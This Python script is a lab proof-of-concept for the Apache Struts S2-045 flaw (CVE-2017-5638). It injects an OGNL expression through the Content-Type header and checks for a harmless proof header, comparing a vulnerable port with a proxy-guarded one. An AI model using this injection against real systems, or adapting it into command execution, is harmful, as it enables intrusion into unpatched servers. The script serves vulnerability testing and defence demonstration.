#!/usr/bin/env python3
"""Send a non-destructive CVE-2017-5638 proof request to the lab target."""

import argparse
import json
import sys
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

PAYLOAD = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Lab-Proof',233*233)}.multipart/form-data"
DASHBOARD_URL = "http://127.0.0.1:8090"


def report_to_dashboard(target, port, status, proof):
    """Send only the observed lab result to the loopback-only dashboard."""
    event = json.dumps({
        "target": target,
        "port": port,
        "status": status,
        "proof": "" if proof == "<absent>" else proof,
    }).encode("utf-8")
    request = Request(
        DASHBOARD_URL + "/api/events",
        data=event,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urlopen(request, timeout=1):
            print("Dashboard: result sent to local Kali visualization")
    except (URLError, TimeoutError, OSError):
        print("Dashboard: unavailable; terminal result is unchanged")


def main():
    parser = argparse.ArgumentParser(description="Replay the safe S2-045 lab proof header")
    parser.add_argument("target", help="Target VM host-only IP, for example 192.168.56.20")
    parser.add_argument("--port", type=int, choices=(8080, 8081), default=8080,
                        help="8080 = direct vulnerable target; 8081 = guarded path (default: 8080)")
    parser.add_argument("--dashboard", action="store_true",
                        help="send the observed result to the local Kali dashboard")
    args = parser.parse_args()

    url = f"http://{args.target}:{args.port}/"
    request = Request(url, data=b"", method="POST", headers={
        "Content-Type": PAYLOAD,
        "User-Agent": "Equifax-S2-045-Isolated-Lab/1.0",
        "Connection": "close",
    })

    print(f"Target: {url}")
    print("Technique: S2-045 expression evaluation in Content-Type")
    print("Effect: add X-Lab-Proof response header (no OS command or file changes)")
    try:
        try:
            response = urlopen(request, timeout=8)
        except HTTPError as error:
            response = error
        proof = response.headers.get("X-Lab-Proof", "<absent>")
        print(f"HTTP status: {response.status}")
        print(f"X-Lab-Proof: {proof}")
        if args.dashboard:
            report_to_dashboard(args.target, args.port, response.status, proof)
        if response.status == 200 and proof == "54289":
            print("RESULT: expression evaluated by the vulnerable target")
            return 0
        if response.status == 403:
            print("RESULT: request blocked by the defensive proxy")
            return 0
        print("RESULT: no proof header; inspect the target/proxy logs")
        return 1
    except (URLError, TimeoutError, OSError) as error:
        print(f"Request failed: {error}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())